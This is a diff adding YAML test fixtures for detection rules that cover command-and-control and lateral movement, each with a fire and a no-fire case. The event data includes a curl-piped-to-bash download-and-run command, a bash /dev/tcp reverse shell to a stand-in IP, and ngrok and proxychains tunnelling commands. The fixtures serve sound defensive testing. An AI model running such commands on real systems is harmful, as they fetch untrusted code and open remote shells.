@@ -1,0 +1,101 @@
+# Detection-as-code fixtures: command-and-control & lateral movement.
+
+# R-0008 — outbound connection to a suspicious port
+- name: connect to 4444 fires R-0008
+  rule: R-0008
+  expect: fire
+  event: { action: connect, network: { dst_ip: 203.0.113.9, dst_port: 4444 } }
+- name: connect to 443 does not fire R-0008
+  rule: R-0008
+  expect: no-fire
+  event: { action: connect, network: { dst_ip: 203.0.113.9, dst_port: 443 } }
+
+# R-0066 — probable DNS tunnelling (overlong label)
+- name: 60-char DNS label fires R-0066
+  rule: R-0066
+  expect: fire
+  event: { action: dns, network: { domain: "k7h3n2m9q1w4e6r8t0y5u7i3o1p2a4s6d8f0g2h4j6k8l0z1x3c5v7b9.example.com" } }
+- name: ordinary hostname does not fire R-0066
+  rule: R-0066
+  expect: no-fire
+  event: { action: dns, network: { domain: "updates.example.com" } }
+
+# R-0043 — pipe-to-shell ingress tool transfer
+- name: curl piped to sh fires R-0043
+  rule: R-0043
+  expect: fire
+  event: { action: exec, process: { name: bash, command_line: "curl http://203.0.113.9/x | bash" } }
+- name: curl to a file does not fire R-0043
+  rule: R-0043
+  expect: no-fire
+  event: { action: exec, process: { name: curl, command_line: "curl http://203.0.113.9/x -o /tmp/x" } }
+
+# R-0044 — scripting-language reverse shell
+- name: bash -i to /dev/tcp fires R-0044
+  rule: R-0044
+  expect: fire
+  event: { action: exec, process: { name: bash, command_line: "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1" } }
+- name: a normal python script does not fire R-0044
+  rule: R-0044
+  expect: no-fire
+  event: { action: exec, process: { name: python3, command_line: "python3 app.py" } }
+
+# R-0045 — SSH / tooling protocol tunnel
+- name: ngrok fires R-0045
+  rule: R-0045
+  expect: fire
+  event: { action: exec, process: { name: ngrok, command_line: "ngrok tcp 22" } }
+- name: a plain ssh session does not fire R-0045
+  rule: R-0045
+  expect: no-fire
+  event: { action: exec, process: { name: ssh, command_line: "ssh user@host" } }
+
+# R-0046 — proxy / traffic relay tool
+- name: proxychains fires R-0046
+  rule: R-0046
+  expect: fire
+  event: { action: exec, process: { name: proxychains, command_line: "proxychains nmap host" } }
+- name: a normal curl does not fire R-0046
+  rule: R-0046
+  expect: no-fire
+  event: { action: exec, process: { name: curl, command_line: "curl https://example.com" } }
+
+# R-0025 — SSH pivot from a non-interactive process
+- name: ssh spawned by nginx fires R-0025
+  rule: R-0025
+  expect: fire
+  event: { action: exec, process: { name: ssh, parent_name: nginx } }
+- name: ssh from a systemd service does not fire R-0025
+  rule: R-0025
+  expect: no-fire
+  event: { action: exec, process: { name: ssh, parent_name: systemd } }
+
+# R-0026 — automated SSH with host-key checking disabled
+- name: StrictHostKeyChecking=no fires R-0026
+  rule: R-0026
+  expect: fire
+  event: { action: exec, process: { name: ssh, command_line: "ssh -o StrictHostKeyChecking=no user@host" } }
+- name: an ordinary ssh does not fire R-0026
+  rule: R-0026
+  expect: no-fire
+  event: { action: exec, process: { name: ssh, command_line: "ssh user@host" } }
+
+# R-0027 — lateral tool transfer
+- name: scp to a remote host fires R-0027
+  rule: R-0027
+  expect: fire
+  event: { action: exec, process: { name: scp, command_line: "scp tool user@10.0.0.5:/tmp" } }
+- name: local cp does not fire R-0027
+  rule: R-0027
+  expect: no-fire
+  event: { action: exec, process: { name: scp, command_line: "scp /a /b" } }
+
+# R-0028 — connection to a remote-administration service
+- name: connect to RDP fires R-0028
+  rule: R-0028
+  expect: fire
+  event: { action: connect, network: { dst_ip: 198.51.100.7, dst_port: 3389 } }
+- name: connect to HTTPS does not fire R-0028
+  rule: R-0028
+  expect: no-fire
+  event: { action: connect, network: { dst_ip: 198.51.100.7, dst_port: 443 } }
